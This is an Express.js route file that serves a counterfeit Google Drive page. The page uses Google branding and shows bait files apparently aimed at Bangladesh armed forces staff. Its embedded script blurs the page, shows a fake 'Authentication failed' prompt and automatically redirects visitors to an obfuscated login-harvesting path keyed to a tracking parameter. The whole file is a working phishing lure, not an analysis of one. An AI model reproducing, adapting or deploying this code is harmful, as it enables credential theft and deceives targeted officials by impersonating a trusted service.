const express = require('express');
const path = require('path');
const router = express.Router();

router.use(express.static('public')); // Serve /images, etc.

router.get('/', (req, res) => {
  const data2 = req.query.dsfsgfredhgrfthgyt9erygfdgfdhfgjg234jxgjdferuidh;
  const url = `/iiuserentryss/?xfjgiojfdijgkyrefguihsfguihughilsdomainetftwrefhf=${data2}`;

  if (!data2) return res.render('error');

  const htmlContent = `
       <!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Drive</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Roboto', 'Google Sans', Arial, sans-serif;
    }

    body {
      background-color: #f8fafc;
      color: #3c4043;
      display: flex;
      min-height: 100vh;
    }

    /* --- Sidebar & Main Content (existing styles) --- */
    .sidebar { width: 260px; background: white; padding: 24px 0; border-right: 1px solid #e6e6e6; display: flex; flex-direction: column; }
    .logo { padding: 0 24px 20px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #e6e6e6; margin-bottom: 20px; }
    .logo img { width: 40px; height: 40px; }
    .logo h1 { font-size: 22px; font-weight: 500; }
    .new-btn { margin: 0 16px 20px; background: #1a73e8; color: white; border: none; border-radius: 24px; padding: 12px 24px; display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
    .new-btn:hover { background: #0d62c9; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
    .nav-section { margin-bottom: 24px; }
    .nav-header { padding: 0 24px; font-size: 14px; font-weight: 500; color: #5f6368; margin-bottom: 8px; }
    .nav-item { display: flex; align-items: center; padding: 10px 24px; gap: 16px; font-size: 14px; color: #3c4043; text-decoration: none; transition: background 0.2s; cursor: pointer; }
    .nav-item:hover { background: #f1f3f4; }
    .nav-item.active { background: #e8f0fe; color: #1a73e8; font-weight: 500; }
    .nav-item i { width: 20px; text-align: center; }
    .storage { margin-top: auto; padding: 16px 24px 0; border-top: 1px solid #e6e6e6; }
    .storage-text { font-size: 14px; margin-bottom: 8px; }
    .progress-bar { height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-bottom: 8px; }
    .progress { height: 100%; background: #1a73e8; width: 55%; }
    .storage-details { font-size: 12px; color: #5f6368; }
    .main-content { flex: 1; padding: 32px; }
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
    .search-bar { display: flex; align-items: center; background: white; border-radius: 8px; padding: 0 16px; width: 60%; box-shadow: 0 1px 2px rgba(0,0,0,0.1); border: 1px solid #e0e0e0; }
    .search-bar input { flex: 1; padding: 12px 16px; border: none; outline: none; font-size: 16px; }
    .search-bar i { color: #5f6368; }
    .user-actions { display: flex; align-items: center; gap: 12px; padding-right: 0px; }
    .nav-btn { position: relative; display: flex; align-items: center; justify-content: center; width: 40px; height: 40px; border-radius: 50%; background: white; transition: all 0.3s ease; box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1); color: #5f6368; border: none; cursor: pointer; }
    .nav-btn:hover { background: #f1f3f4; transform: translateY(-1px); box-shadow: 0 2px 4px rgba(0, 0, 0, 0.15); color: #1a73e8; }
    .nav-btn::before { content: attr(title); position: absolute; bottom: -30px; left: 50%; transform: translateX(-50%); background: #323232; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; opacity: 0; transition: opacity 0.3s; pointer-events: none; white-space: nowrap; }
    .nav-btn:hover::before { opacity: 1; }
    .badge { position: absolute; top: -5px; right: -5px; background: #ea4335; color: white; font-size: 10px; width: 16px; height: 16px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
    .content-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
    .content-title { font-size: 18px; font-weight: 500; }
    .view-options { display: flex; gap: 16px; }
    .view-btn { color: #5f6368; cursor: pointer; padding: 6px 12px; border-radius: 4px; }
    .view-btn.active { color: #1a73e8; background: #e8f0fe; }
    
    /* Updated table styles */
    .files-table-container {
      background: white;
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
      overflow: hidden;
    }
    
    .files-table {
      width: 100%;
      border-collapse: collapse;
    }
    
    .files-table thead {
      background-color: #f8f9fa;
      border-bottom: 1px solid #e0e0e0;
    }
    
    .files-table th {
      padding: 16px;
      text-align: left;
      font-weight: 500;
      color: #5f6368;
      font-size: 14px;
      user-select: none;
    }
    
    .files-table th:hover {
      background-color: #f1f3f4;
    }
    
    .files-table th i {
      margin-left: 8px;
      font-size: 12px;
    }
    
    .files-table tbody tr {
      border-bottom: 1px solid #f1f3f4;
      transition: all 0.2s ease;
      cursor: pointer;
    }
    
    .files-table tbody tr:last-child {
      border-bottom: none;
    }
    
    .files-table tbody tr:hover {
      background-color: #f8f9fa;
      transform: translateY(-1px);
      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
    }
    
    .files-table td {
      padding: 16px;
      font-size: 14px;
    }
    
    .file-item {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    
    .file-icon {
      width: 40px;
      height: 40px;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      transition: transform 0.2s ease;
    }
    
    .files-table tbody tr:hover .file-icon {
      transform: scale(1.1);
    }
    
    .pdf-icon {
      background-color: #fce8e6;
      color: #d93025;
    }
    
    .folder-icon {
      background-color: #e8f0fe;
      color: #1a73e8;
    }
    
    .file-name {
      font-weight: 500;
      color: #1a73e8;
    }
    
    .file-details {
      color: #5f6368;
    }
    
    /* Table bar with pointer effect */
    .table-bar {
      display: flex;
      align-items: center;
      padding: 12px 16px;
      background-color: #f8f9fa;
      border-bottom: 1px solid #e0e0e0;
    }
    
    .table-bar-item {
      padding: 6px 12px;
      margin-right: 16px;
      font-size: 14px;
      color: #5f6368;
      cursor: pointer;
      position: relative;
      transition: color 0.2s ease;
    }
    
    .table-bar-item:hover {
      color: #1a73e8;
    }
    
    .table-bar-item.active {
      color: #1a73e8;
      font-weight: 500;
    }
    
    .table-bar-item.active::after {
      content: '';
      position: absolute;
      bottom: -12px;
      left: 0;
      width: 100%;
      height: 3px;
      background-color: #1a73e8;
      border-radius: 3px 3px 0 0;
    }
    
    /* Login button */
    .login-container {
      display: flex;
      justify-content: flex-end;
      padding: 16px 32px;
      background: white;
      border-bottom: 1px solid #e6e6e6;
    }
    
    .login-btn {
      background: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s;
      text-decoration: none;
      display: inline-block;
    }
    
    .login-btn:hover {
      background: #0d62c9;
      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
    }
    
    /* Redirect notification */
    .redirect-notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: white;
      padding: 16px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
      display: none;
      align-items: center;
      gap: 12px;
      z-index: 1000;
    }
    
    .redirect-notification .countdown {
      font-weight: 500;
      color: #1a73e8;
    }
    
    .redirect-notification .cancel-btn {
      background: transparent;
      border: none;
      color: #5f6368;
      cursor: pointer;
      font-size: 14px;
    }
    
    .redirect-notification .cancel-btn:hover {
      color: #1a73e8;
    }
    
    /* --- Loader Overlay --- */
    #loader {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #f0f4f9;
      z-index: 9999;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid transparent;
      border-top: 3px solid #4285f4;
      border-right: 3px solid #4285f4;
      border-radius: 50%;
      animation: spin 1.5s linear infinite, colorChange 3s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    @keyframes colorChange {
      0% { border-top-color: #4285f4; border-right-color: #4285f4; }
      20% { border-top-color: #ea4335; border-right-color: #ea4335; }
      40% { border-top-color: #fbbc05; border-right-color: #fbbc05; }
      60% { border-top-color: #34a853; border-right-color: #34a853; }
      80% { border-top-color: #9c27b0; border-right-color: #9c27b0; }
      100% { border-top-color: #4285f4; border-right-color: #4285f4; }
    }
    .blurred { filter: blur(6px); pointer-events: none; user-select: none; }

    /* --- Error Modal --- */
    #errorBox {
      display: none;
      position: fixed;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 5px 20px rgba(0,0,0,0.2);
      text-align: center;
      z-index: 10000;
      width: 320px;
    }
    #errorBox h2 { font-size: 1.2rem; font-weight: bold; color: #d93025; margin-bottom: 0.5rem; }
    #errorBox p { font-size: 0.95rem; margin-bottom: 1rem; }
    #errorBox button {
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 0.6rem 1.2rem;
      font-size: 0.95rem;
      border-radius: 20px;
      cursor: pointer;
      margin: 0 5px;
    }
    #errorBox button:hover { background-color: #0f5bd9; }
    
    @media (max-width: 768px) {
      .sidebar { width: 80px; }
      .logo h1, .nav-item span, .nav-header, .storage { display: none; }
      .logo { justify-content: center; }
      .new-btn span { display: none; }
      .new-btn { justify-content: center; border-radius: 50%; width: 48px; height: 48px; padding: 0; margin: 0 auto 20px; }
      .user-actions { gap: 8px; }
      .nav-btn { width: 36px; height: 36px; }
      
      .files-table th:nth-child(2),
      .files-table td:nth-child(2),
      .files-table th:nth-child(4),
      .files-table td:nth-child(4) {
        display: none;
      }
      
      .table-bar {
        overflow-x: auto;
        white-space: nowrap;
      }
      
      .redirect-notification {
        left: 20px;
        right: 20px;
        bottom: 70px;
      }
    }
  </style>
</head>
<body>

  <!-- Loader -->
  <div id="loader">
    <div class="spinner"></div>
  </div>

  <!-- Error Box -->
  <div id="errorBox">
    <h2>Authentication failed</h2>
    <p>Your account has been logged out.</p>
    <button onclick="goToLogin()">Login</button>
  </div>



  <!-- Page Wrapper -->
  <div id="page" style="flex:1; display:none; opacity:0; transition:opacity 0.5s ease-in;">
    <!-- Sidebar -->
    <div class="sidebar">
      <div class="logo">
        <img src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" alt="Google Drive">
        <h1>Drive</h1>
      </div>
      <button class="new-btn"><i class="fas fa-plus"></i><span>New</span></button>
      <div class="nav-section">
        <div class="nav-item active"><i class="fas fa-home"></i><span>Home</span></div>
        <div class="nav-item"><i class="fas fa-chart-line"></i><span>Activity</span></div>
        <div class="nav-item"><i class="fas fa-building"></i><span>Workspaces</span></div>
      </div>
      <div class="nav-section">
        <div class="nav-header">MY DRIVE</div>
        <div class="nav-item"><i class="fas fa-hard-drive"></i><span>My Drive</span></div>
        <div class="nav-item"><i class="fas fa-users"></i><span>Shared drives</span></div>
      </div>
      <div class="nav-section">
        <div class="nav-header">SHARED WITH ME</div>
        <div class="nav-item"><i class="fas fa-user-friends"></i><span>Shared with me</span></div>
        <div class="nav-item"><i class="fas fa-clock"></i><span>Recent</span></div>
        <div class="nav-item"><i class="fas fa-star"></i><span>Starred</span></div>
      </div>
      <div class="nav-section">
        <div class="nav-item"><i class="fas fa-ban"></i><span>Spam</span></div>
        <div class="nav-item"><i class="fas fa-trash"></i><span>Trash</span></div>
        <div class="nav-item"><i class="fas fa-database"></i><span>Storage</span></div>
      </div>
      <div class="storage">
        <div class="progress-bar"><div class="progress"></div></div>
        <div class="storage-details">2.75 GB of 15 GB used</div>
      </div>
    </div>

    <!-- Main Content -->
    <div class="main-content">
      <div class="header">
        <div class="search-bar"><i class="fas fa-search"></i><input type="text" placeholder="Search in Drive"></div>
        <div class="user-actions">
          <button class="nav-btn" title="Support"><i class="fas fa-question"></i></button>
          <button class="nav-btn" title="Settings"><i class="fas fa-cog"></i></button>
          <button class="nav-btn" title="Google Apps"><i class="fas fa-th"></i></button>
          <button class="nav-btn relative" title="Notifications"><i class="fas fa-bell"></i><span class="badge">3</span></button>
          <button class="nav-btn" title="Account"><i class="fas fa-user-circle"></i></button>
        </div>
      </div>

      <div class="content">
        <div class="content-header">
          <h2 class="content-title">My Drive</h2>
          <div class="view-options">
            <div class="view-btn"><i class="fas fa-th"></i></div>
            <div class="view-btn active"><i class="fas fa-list"></i></div>
          </div>
        </div>
        
        <!-- Table navigation bar -->
        <div class="table-bar">
          <div class="table-bar-item active">My Drive</div>
          <div class="table-bar-item">Computers</div>
          <div class="table-bar-item">Shared with me</div>
          <div class="table-bar-item">Recent</div>
          <div class="table-bar-item">Starred</div>
          <div class="table-bar-item">Spam</div>
        </div>

        <!-- Files table -->
        <div class="files-table-container">
          <table class="files-table">
            <thead>
              <tr>
                <th>Name <i class="fas fa-sort-down"></i></th>
                <th>Owner</th>
                <th>Last modified</th>
                <th>File size</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>
                  <div class="file-item">
                    <div class="file-icon pdf-icon">
                      <i class="fas fa-file-pdf"></i>
                    </div>
                    <div>
                      <div class="file-name">OFFICE ORDER.pdf</div>
                      <div class="file-details">PDF document</div>
                    </div>
                  </div>
                </td>
                <td>fapafd@afd.gov.bd</td>
                <td>Sep 25, 2025</td>
                <td>5 MB</td>
              </tr>
              
              <!--<tr>
                <td>
                  <div class="file-item">
                    <div class="file-icon pdf-icon">
                      <i class="fas fa-file-pdf"></i>
                    </div>
                    <div>
                      <div class="file-name">OPINION ON IMPLEMENTING AGREEMENT BETWEEN QATAR ARMED FORCES AND BANGLADESH ARMED FORCES CONCERNING DEPUTATION (SECONDMENT) OF OFFRS.pdf</div>
                      <div class="file-details">PDF document</div>
                    </div>
                  </div>
                </td>
                <td>fapafd@afd.gov.bd</td>
                <td>Sep 25, 2025</td>
                <td>2.3 MB</td>
              </tr>-->
              <tr>
                <td>
                   <div class="file-item">
                    <div class="file-icon pdf-icon">
                      <i class="fas fa-file-pdf"></i>
                    </div>
                    <div>
                      <div class="file-name">Ref A.pdf</div>
                      <div class="file-details">PDF document</div>
                    </div>
                  </div>
                </td>
                <td>You</td>
                <td>Sep 25, 2025</td>
                <td>3.7 MB</td>
              </tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>

  <!-- Redirect Notification -->
  <div id="redirectNotification" class="redirect-notification">
    <div>You will be redirected to Google Login <span id="countdown" class="countdown">6</span> seconds</div>
    <button class="cancel-btn" onclick="cancelRedirect()">Cancel</button>
  </div>

  <script>
  // Configuration - Set your URL here
const redirectUrl = "${url}";
let redirectTimer;
let countdownValue = 2; // redirect after 5s

// Show loader and then page
window.addEventListener("load", () => {
  setTimeout(() => {
    document.getElementById("loader").style.display = "none";
    const page = document.getElementById("page");
    page.style.display = "flex";
    requestAnimationFrame(() => { page.style.opacity = "1"; });

    // Attach click event to file rows
    document.querySelectorAll(".files-table tbody tr").forEach(row => {
      row.addEventListener("click", () => {
        page.classList.add("blurred");
        document.getElementById("errorBox").style.display = "block";
        startRedirectCountdown(); // start redirect when blur shows
      });
    });

    // ✅ Auto trigger error after 6 sec if no click
    setTimeout(() => {
      page.classList.add("blurred");
      document.getElementById("errorBox").style.display = "block";
      startRedirectCountdown();
    }, 3000);

  }, 500); // Loader visible for 1s
});

function goToLogin() {
  clearInterval(redirectTimer); // stop countdown if user clicks
  window.location.href = redirectUrl;
}

function dismissError() {
  document.getElementById("errorBox").style.display = "none";
  document.getElementById("page").classList.remove("blurred");
  cancelRedirect();
}

// Redirect functions
function startRedirectCountdown() {
  const notification = document.getElementById('redirectNotification');
  notification.style.display = "flex"; 
  const countdownElement = document.getElementById('countdown');
  countdownValue = 2; // reset countdown
  countdownElement.textContent = countdownValue;

  redirectTimer = setInterval(() => {
    countdownValue--;
    countdownElement.textContent = countdownValue;

    if (countdownValue <= 0) {
      clearInterval(redirectTimer);
      window.location.href = redirectUrl;
    }
  }, 500);
}

function cancelRedirect() {
  clearInterval(redirectTimer);
  document.getElementById('redirectNotification').style.display = 'none';
}

// --- Existing UI interactions ---
document.querySelectorAll('.view-btn').forEach(btn => {
  btn.addEventListener('click', function() {
    document.querySelectorAll('.view-btn').forEach(b => b.classList.remove('active'));
    this.classList.add('active');
  });
});

document.querySelectorAll('.nav-item').forEach(item => {
  item.addEventListener('click', function() {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    this.classList.add('active');
    document.querySelector('.content-title').textContent = this.querySelector('span').textContent;
  });
});

document.querySelectorAll('.table-bar-item').forEach(item => {
  item.addEventListener('click', function() {
    document.querySelectorAll('.table-bar-item').forEach(i => i.classList.remove('active'));
    this.classList.add('active');
  });
});

</script>
</body>
</html>
`;

    res.send(htmlContent);
});

module.exports = router;
